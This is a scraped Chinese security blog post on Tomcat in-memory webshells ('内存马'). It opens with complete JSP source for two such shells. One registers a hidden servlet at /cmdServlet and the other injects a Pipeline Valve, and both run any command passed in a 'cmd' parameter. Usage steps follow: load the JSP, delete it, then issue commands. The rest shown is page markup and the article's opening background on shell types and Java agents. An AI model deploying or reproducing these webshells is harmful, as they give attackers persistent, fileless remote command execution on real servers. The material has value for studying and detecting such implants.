import=&quot;java.util.Iterator&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;        &lt;%class Tomcat6789 &#123;    String uri;    String serverName;    StandardContext standardContext;    public Object getField(Object object, String fieldName) &#123;        Field declaredField;        Class clazz = object.getClass();        while (clazz != Object.class) &#123;            try &#123;                declaredField = clazz.getDeclaredField(fieldName);                declaredField.setAccessible(true);                return declaredField.get(object);            &#125; catch (NoSuchFieldException e)&#123;&#125;            catch (IllegalAccessException e)&#123;&#125;            clazz = clazz.getSuperclass();        &#125;        return null;    &#125;    public Tomcat6789() &#123;        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);        Object object;        for (Thread thread : threads) &#123;            if (thread == null) &#123;                continue;            &#125;            if (thread.getName().contains(&quot;exec&quot;)) &#123;                continue;            &#125;            Object target = this.getField(thread, &quot;target&quot;);            if (!(target instanceof Runnable)) &#123;                continue;            &#125;            try &#123;                object = getField(getField(getField(target, &quot;this$0&quot;), &quot;handler&quot;), &quot;global&quot;);            &#125; catch (Exception e) &#123;                continue;            &#125;            if (object == null) &#123;                continue;            &#125;            java.util.ArrayList processors = (java.util.ArrayList) getField(object, &quot;processors&quot;);            Iterator iterator = processors.iterator();            while (iterator.hasNext()) &#123;                Object next = iterator.next();                Object req = getField(next, &quot;req&quot;);                Object serverPort = getField(req, &quot;serverPort&quot;);                if (serverPort.equals(-1))&#123;continue;&#125;                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;serverNameMB&quot;);                this.serverName = (String) getField(serverNameMB, &quot;strValue&quot;);                if (this.serverName == null)&#123;                    this.serverName = serverNameMB.toString();                &#125;                if (this.serverName == null)&#123;                    this.serverName = serverNameMB.getString();                &#125;                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;uriMB&quot;);                this.uri = (String) getField(uriMB, &quot;strValue&quot;);                if (this.uri == null)&#123;                    this.uri = uriMB.toString();                &#125;                if (this.uri == null)&#123;                    this.uri = uriMB.getString();                &#125;                this.getStandardContext();                return;            &#125;        &#125;    &#125;    public void getStandardContext() &#123;        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);        for (Thread thread : threads) &#123;            if (thread == null) &#123;                continue;            &#125;            if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) &#123;                Object target = this.getField(thread, &quot;target&quot;);                HashMap children;                Object jioEndPoint = null;                try &#123;                    jioEndPoint = getField(target, &quot;this$0&quot;);                &#125;catch (Exception e)&#123;&#125;                if (jioEndPoint == null)&#123;                    try&#123;                        jioEndPoint = getField(target, &quot;endpoint&quot;);                    &#125;catch (Exception e)&#123; return; &#125;                &#125;                Object service = getField(getField(getField(getField(getField(jioEndPoint, &quot;handler&quot;), &quot;proto&quot;), &quot;adapter&quot;), &quot;connector&quot;), &quot;service&quot;);                StandardEngine engine = null;                try &#123;                    engine = (StandardEngine) getField(service, &quot;container&quot;);                &#125;catch (Exception e)&#123;&#125;                if (engine == null)&#123;                    engine = (StandardEngine) getField(service, &quot;engine&quot;);                &#125;                children = (HashMap) getField(engine, &quot;children&quot;);                StandardHost standardHost = (StandardHost) children.get(this.serverName);                children = (HashMap) getField(standardHost, &quot;children&quot;);                Iterator iterator = children.keySet().iterator();                while (iterator.hasNext())&#123;                    String contextKey = (String) iterator.next();                    if (!(this.uri.startsWith(contextKey)))&#123;continue;&#125;                    StandardContext standardContext = (StandardContext) children.get(contextKey);                    this.standardContext = standardContext;                    return;                &#125;            &#125;        &#125;    &#125;    public StandardContext getSTC()&#123;        return this.standardContext;    &#125;&#125;%&gt;&lt;%\t\t    \t//获取StandardContext对象        Tomcat6789 a = new Tomcat6789();        StandardContext standardContext = a.getSTC();        \t\t\t//创建恶意servlet\t\tString servletURL = &quot;/cmdServlet&quot;;        String servletName = &quot;CmdServlet&quot;;        Servlet servlet = new Servlet() &#123;            @Override            public void init(ServletConfig servletConfig) &#123;            &#125;            @Override            public ServletConfig getServletConfig() &#123;                return null;            &#125;            @Override            public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException &#123;                String cmd = servletRequest.getParameter(&quot;cmd&quot;);                if (&quot;cmd&quot; != null) &#123;                    InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();                    Scanner s = new Scanner(in).useDelimiter(&quot;\\\\A&quot;);                    String output = s.hasNext() ? s.next() : &quot;&quot;;                    PrintWriter out = servletResponse.getWriter();                    out.println(output);                    out.flush();                    out.close();                &#125;            &#125;            @Override            public String getServletInfo() &#123;                return null;            &#125;            @Override            public void destroy() &#123;            &#125;        &#125;;                //创建wrapper，设置恶意servlet        Wrapper wrapper = standardContext.createWrapper();        wrapper.setName(servletName);        wrapper.setServlet(servlet);        wrapper.setServletClass(servlet.getClass().getName());        // 令loadOnStartup大于0        wrapper.setLoadOnStartup(1);        // 添加到children容器中        standardContext.addChild(wrapper);                // 设置servlet映射        standardContext.addServletMappingDecoded(servletURL, servletName);%&gt;\n\n访问注入内存马的jsp文件，然后删除jsp文件，访问/cmdServlet路由，添加cmd参数执行命令\n\nPipeline-Valve内存马实现Container请求处理流程源码分析中讲到过Pineline的调用链，setNext、getNext、invoke 这三个方法，通过setNext设置该阀的下一阀，通过 getNext 返回该阀的下一个阀的引用，invoke 方法则执行该阀内部自定义的请求处理代码。\n\n创建恶意valve\n获取Pineline对象通过addValve增加恶意valve\n\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardEngine&quot;%&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardHost&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot;%&gt;&lt;%@ page import=&quot;java.util.HashMap&quot;%&gt;&lt;%@ page import=&quot;java.util.Iterator&quot;%&gt;&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.Valve&quot; %&gt;&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;&lt;%@ page import=&quot;java.io.PrintWriter&quot; %&gt;&lt;%    class Tomcat6789 &#123;        String uri;        String serverName;        StandardContext standardContext;        public Object getField(Object object, String fieldName) &#123;            Field declaredField;            Class clazz = object.getClass();            while (clazz != Object.class) &#123;                try &#123;                    declaredField = clazz.getDeclaredField(fieldName);                    declaredField.setAccessible(true);                    return declaredField.get(object);                &#125; catch (NoSuchFieldException e)&#123;&#125;                catch (IllegalAccessException e)&#123;&#125;                clazz = clazz.getSuperclass();            &#125;            return null;        &#125;        public Tomcat6789() &#123;            Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);            Object object;            for (Thread thread : threads) &#123;                if (thread == null) &#123;                    continue;                &#125;                if (thread.getName().contains(&quot;exec&quot;)) &#123;                    continue;                &#125;                Object target = this.getField(thread, &quot;target&quot;);                if (!(target instanceof Runnable)) &#123;                    continue;                &#125;                try &#123;                    object = getField(getField(getField(target, &quot;this$0&quot;), &quot;handler&quot;), &quot;global&quot;);                &#125; catch (Exception e) &#123;                    continue;                &#125;                if (object == null) &#123;                    continue;                &#125;                java.util.ArrayList processors = (java.util.ArrayList) getField(object, &quot;processors&quot;);                Iterator iterator = processors.iterator();                while (iterator.hasNext()) &#123;                    Object next = iterator.next();                    Object req = getField(next, &quot;req&quot;);                    Object serverPort = getField(req, &quot;serverPort&quot;);                    if (serverPort.equals(-1))&#123;continue;&#125;                    org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;serverNameMB&quot;);                    this.serverName = (String) getField(serverNameMB, &quot;strValue&quot;);                    if (this.serverName == null)&#123;                        this.serverName = serverNameMB.toString();                    &#125;                    if (this.serverName == null)&#123;                        this.serverName = serverNameMB.getString();                    &#125;                    org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, &quot;uriMB&quot;);                    this.uri = (String) getField(uriMB, &quot;strValue&quot;);                    if (this.uri == null)&#123;                        this.uri = uriMB.toString();                    &#125;                    if (this.uri == null)&#123;                        this.uri = uriMB.getString();                    &#125;                    this.getStandardContext();                    return;                &#125;            &#125;        &#125;        public void getStandardContext() &#123;            Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);            for (Thread thread : threads) &#123;                if (thread == null) &#123;                    continue;                &#125;                if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) &#123;                    Object target = this.getField(thread, &quot;target&quot;);                    HashMap children;                    Object jioEndPoint = null;                    try &#123;                        jioEndPoint = getField(target, &quot;this$0&quot;);                    &#125;catch (Exception e)&#123;&#125;                    if (jioEndPoint == null)&#123;                        try&#123;                            jioEndPoint = getField(target, &quot;endpoint&quot;);                        &#125;catch (Exception e)&#123; return; &#125;                    &#125;                    Object service = getField(getField(getField(getField(getField(jioEndPoint, &quot;handler&quot;), &quot;proto&quot;), &quot;adapter&quot;), &quot;connector&quot;), &quot;service&quot;);                    StandardEngine engine = null;                    try &#123;                        engine = (StandardEngine) getField(service, &quot;container&quot;);                    &#125;catch (Exception e)&#123;&#125;                    if (engine == null)&#123;                        engine = (StandardEngine) getField(service, &quot;engine&quot;);                    &#125;                    children = (HashMap) getField(engine, &quot;children&quot;);                    StandardHost standardHost = (StandardHost) children.get(this.serverName);                    children = (HashMap) getField(standardHost, &quot;children&quot;);                    Iterator iterator = children.keySet().iterator();                    while (iterator.hasNext())&#123;                        String contextKey = (String) iterator.next();                        if (!(this.uri.startsWith(contextKey)))&#123;continue;&#125;                        StandardContext standardContext = (StandardContext) children.get(contextKey);                        this.standardContext = standardContext;                        return;                    &#125;                &#125;            &#125;        &#125;        public StandardContext getSTC()&#123;            return this.standardContext;        &#125;    &#125;%&gt;&lt;%    //获取StandardContext对象    Tomcat6789 a = new Tomcat6789();    StandardContext standardContext = a.getSTC();%&gt;&lt;%    //创建恶意valve    class MyValve implements Valve &#123;        private Valve next;        @Override        public Valve getNext() &#123;            return next;        &#125;        @Override        public void setNext(Valve valve) &#123;            next = valve;        &#125;        @Override        public void backgroundProcess() &#123;        &#125;        @Override        public void invoke(Request request, Response response) throws IOException, ServletException &#123;            HttpServletRequest req = request;            String cmd = req.getParameter(&quot;cmd&quot;);            if (cmd != null) &#123;                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();                Scanner s = new Scanner(in).useDelimiter(&quot;\\\\A&quot;);                String output = s.hasNext() ? s.next() : &quot;&quot;;                PrintWriter out = response.getWriter();                out.println(output);                out.flush();                out.close();            &#125;            getNext().invoke(request, response);        &#125;        @Override        public boolean isAsyncSupported() &#123;            return true;        &#125;    &#125;    //获取Pineline对象通过addValve增加恶意valve    standardContext.getPipeline().addValve(new MyValve());%&gt;\n\n访问注入valve内存马的jsp文件，然后删除jsp文件，访问任意路由，添加cmd参数执行命令\n\n","dateCreated":"2022-01-15T20:39:17+08:00","dateModified":"2022-03-02T20:44:26+08:00","datePublished":"2022-01-15T20:39:17+08:00","description":"本文从tomcat容器（Container）的请求处理流程来以及组件的注册流程来分析tomcat内存马的实现。","headline":"Tomcat内存马","image":[null,"238870.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://self209.github.io/2022/01/15/20220115/"},"publisher":{"@type":"Organization","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"url":"https://self209.github.io/2022/01/15/20220115/","keywords":"java安全","thumbnailUrl":"238870.jpg"}</script>
    <meta name="description" content="本文从tomcat容器（Container）的请求处理流程来以及组件的注册流程来分析tomcat内存马的实现。">
<meta property="og:type" content="blog">
<meta property="og:title" content="Tomcat内存马">
<meta property="og:url" content="https://self209.github.io/2022/01/15/20220115/index.html">
<meta property="og:site_name" content="self_209&#39;blog">
<meta property="og:description" content="本文从tomcat容器（Container）的请求处理流程来以及组件的注册流程来分析tomcat内存马的实现。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212152827701.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212152843420.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212152930191.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212153005406.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212153028959.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212153042806.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212153132295.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212153213669.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212154907346.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212154752256.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212164144742.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212164410046.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220116105827112.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220118170335236.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121151928456.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119152529080.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119152622420.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119153140381.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119153212066.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119153233159.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119153942546.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119154118692.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119154517479.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119154720296.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119154859255.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119172634689.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119172804432.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119172907602.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119172951865.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119173132977.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119173958993.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119174240876.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119174548765.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220119174813113.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121143821246.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121143932662.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220209191023032.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220209191201097.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121205556936.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121205819892.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121210017081.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121221644901.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121211150103.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121210511462.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121211439109.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121212412796.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121213550647.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121213621056.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121214135129.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121214246222.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121214841718.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121220435589.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121220550065.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220121220836758.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220209203543195.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220209203848786.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220209210052521.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220211145937127.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220228165742735.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220228170020689.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220228170043181.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220228170058171.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220228170342553.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220228210933114.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220228213945310.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220228220927724.png">
<meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/image-20220228230314314.png">
<meta property="article:published_time" content="2022-01-15T12:39:17.000Z">
<meta property="article:modified_time" content="2022-03-02T12:44:26.690Z">
<meta property="article:author" content="self_209">
<meta property="article:tag" content="java安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://self209.github.io/2022/01/15/20220115/image-20220212152827701.png">
    
    
        
    
    
    
    
        <meta property="og:image" content="https://self209.github.io/2022/01/15/20220115/238870.jpg"/>
        <meta class="swiftype" name="image" data-type="enum" content="https://self209.github.io/2022/01/15/20220115/238870.jpg"/>
    
    
    <!--STYLES-->
    
<link rel="stylesheet" href="/assets/css/style-gt5qcce6mgvuqwcgifha2ylts94nspkxjckwcuei5fxp2ypavhmsle0ivz1f.min.css">

    <!--STYLES END-->
    

    

    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    

<header id="header" data-behavior="5">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a
            class="header-title-link"
            href="/"
            aria-label=""
        >
            self_209&#39;blog
        </a>
    </div>
    
        
            <a
                class="header-right-picture "
                href="#about"
                aria-label="打开链接: /#about"
            >
        
        
        </a>
    
</header>

            <!-- Define author's picture -->


<nav id="sidebar" data-behavior="5">
    <div class="sidebar-container">
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/"
                            
                            rel="noopener"
                            title="首页"
                        >
                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">首页</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-categories"
                            
                            rel="noopener"
                            title="分类"
                        >
                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">分类</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-tags"
                            
                            rel="noopener"
                            title="标签"
                        >
                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">标签</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="/all-archives"
                            
                            rel="noopener"
                            title="归档"
                        >
                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">归档</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="#about"
                            
                            rel="noopener"
                            title="关于"
                        >
                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">关于</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://github.com/self209"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="GitHub"
                        >
                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="https://twitter.com/"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="Twitter"
                        >
                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Twitter</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a
                            class="sidebar-button-link "
                            href="mailto:2662686939@qq.com"
                            
                                target="_blank"
                            
                            rel="noopener"
                            title="邮箱"
                        >
                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">邮箱</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
        <div class="post-header-cover
                    text-center
                    "
             style="background-image:url('/2022/01/15/20220115/238870.jpg');"
             data-behavior="5">
            
                <div class="post-header main-content-wrap text-center">
    
        <h1 class="post-title">
            Tomcat内存马
        </h1>
    
    
        <div class="post-meta">
    <time datetime="2022-01-15T20:39:17+08:00">
	
		    1月 15, 2022
    	
    </time>
    
</div>

    
</div>

            
        </div>

            <div id="main" data-behavior="5"
                 class="hasCover
                        hasCoverMetaIn
                        ">
                
<article class="post">
    
    
    <div class="post-content markdown">
        <div class="main-content-wrap">
            <p>本文从tomcat容器（Container）的请求处理流程来以及组件的注册流程来分析tomcat内存马的实现。</p>
<span id="more"></span>

 <h1 id="table-of-contents">目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%B1%BB%E5%9E%8B"><span class="toc-text">内存马类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-agent%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">java agent基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#premain"><span class="toc-text">premain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#VirtualMachine"><span class="toc-text">VirtualMachine</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Instrumentation"><span class="toc-text">Instrumentation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#agentmain"><span class="toc-text">agentmain</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">Tomcat基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Listener"><span class="toc-text">Listener</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Filter"><span class="toc-text">Filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Servlet"><span class="toc-text">Servlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Container-%E7%BB%93%E6%9E%84"><span class="toc-text">Container 结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Container%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B"><span class="toc-text">Container请求处理流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Container%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">Container请求处理流程源码分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Servlet%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="toc-text">Servlet加载与初始化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#StandardContext"><span class="toc-text">StandardContext</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FilterMap"><span class="toc-text">FilterMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FilterDef"><span class="toc-text">FilterDef</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">Agent型内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96StandardContext%E5%AF%B9%E8%B1%A1"><span class="toc-text">获取StandardContext对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Listener%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="toc-text">Listener内存马实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="toc-text">Filter内存马实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#servlet%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="toc-text">servlet内存马实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pipeline-Valve%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0"><span class="toc-text">Pipeline-Valve内存马实现</span></a></li></ol></li></ol>

<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="内存马类型"><a href="#内存马类型" class="headerlink" title="内存马类型"></a>内存马类型</h3><p>目前业界的内存马主要分为两大类：</p>
<ul>
<li><p>Agent型 利用instrument机制，在不增加新类和新方法的情况下，对现有类的执行逻辑进行修改。JVM层注入，通用性强。</p>
</li>
<li><p>非Agent型 </p>
<ul>
<li><p>servlet规范型</p>
<blockquote>
<p>动态注册符合servlet规范的自定义恶意组件到web容器中，攻击方通过请求自定义路由实现与内存马通信</p>
</blockquote>
<ol>
<li>servlet</li>
<li>Filter</li>
<li>Listener</li>
</ol>
</li>
<li><p>基于java框架实现型</p>
<blockquote>
<p>servlet规范型原理类似，也是动态注册。不同之处是针对java框架的特有属性。</p>
</blockquote>
<ol>
<li>tomcat Pipeline-Valve </li>
<li>struts2 interceptor</li>
<li>spring controller</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="java-agent基础知识"><a href="#java-agent基础知识" class="headerlink" title="java agent基础知识"></a>java agent基础知识</h3><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9450#toc-3">https://xz.aliyun.com/t/9450#toc-3</a></p>
<blockquote>
<p>在JDK1.5以后，javaagent是一种能够在不影响正常编译的情况下，修改字节码。</p>
</blockquote>
<p>Agent分为两种，一种是在主程序之前运行的Agent，一种是在主程序之后运行的Agent（前者的升级版，1.6以后提供）</p>
<ul>
<li>premain方法，主程序之前运行的Agent。</li>
<li>agentmain方法，主程序之后运行的Agent。</li>
</ul>
<h4 id="premain"><a href="#premain" class="headerlink" title="premain"></a>premain</h4><p>写一个premain实例</p>
<p>1、创建一个PremainAgent类</p>
